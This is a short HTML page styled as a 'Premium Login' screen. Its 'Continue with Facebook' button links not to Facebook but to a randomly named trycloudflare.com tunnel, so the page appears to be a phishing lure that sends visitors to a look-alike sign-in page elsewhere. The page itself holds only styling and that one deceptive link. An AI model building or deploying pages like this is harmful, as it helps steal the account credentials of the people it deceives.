<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Premium Login</title>

<!-- Google Font -->
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>
* {
    box-sizing: border-box;
    font-family: 'Poppins', sans-serif;
}

body {
    margin: 0;
    height: 100vh;
    background: linear-gradient(135deg, #667eea, #764ba2);
    display: flex;
    justify-content: center;
    align-items: center;
}

/* Glass Card */
.container {
    width: 380px;
    padding: 30px;
    border-radius: 16px;
    background: rgba(255, 255, 255, 0.18);
    backdrop-filter: blur(14px);
    -webkit-backdrop-filter: blur(14px);
    box-shadow: 0 20px 40px rgba(0,0,0,0.2);
    text-align: center;
    color: #fff;
    animation: fadeIn 0.8s ease;
}

@keyframes fadeIn {
    from {
        opacity: 0;
        transform: translateY(20px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

.header h1 {
    margin: 0;
    font-weight: 600;
    letter-spacing: 0.5px;
}

.header p {
    margin-top: 6px;
    font-size: 14px;
    opacity: 0.85;
}

/* Info Card */
.card {
    margin: 22px 0;
    padding: 16px;
    background: rgba(255,255,255,0.15);
    border-radius: 10px;
    font-size: 14px;
    line-height: 1.6;
}

/* Button */
.fb-link {
    text-decoration: none;
}

.fb-button {
    width: 100%;
    padding: 14px;
    border-radius: 10px;
    border: none;
    background: linear-gradient(135deg, #1877f2, #0f5bd8);
    color: #fff;
    font-size: 15px;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.3s ease;
    box-shadow: 0 10px 20px rgba(24,119,242,0.4);
}

.fb-button:hover {
    transform: translateY(-2px);
    box-shadow: 0 15px 30px rgba(24,119,242,0.55);
}

.fb-button:active {
    transform: scale(0.98);
}

/* Footer */
.footer {
    margin-top: 22px;
    font-size: 12px;
    opacity: 0.7;
}
</style>
</head>

<body>

<div class="container">
    <div class="header">
        <h1>Welcome Back</h1>
        <p>Sign in to continue your journey</p>
    </div>

    <div class="card">
        Step into the future with us.  
        Connect your account and explore a new digital experience.
    </div>

    <a href="https://ampland-pill-known-actual.trycloudflare.com" class="fb-link">
        <button class="fb-button">
            Continue with Facebook
        </button>
    </a>

    <div class="footer">
        Â© 2026 Demo Website. All rights reserved.
    </div>
</div>

</body>
</html>
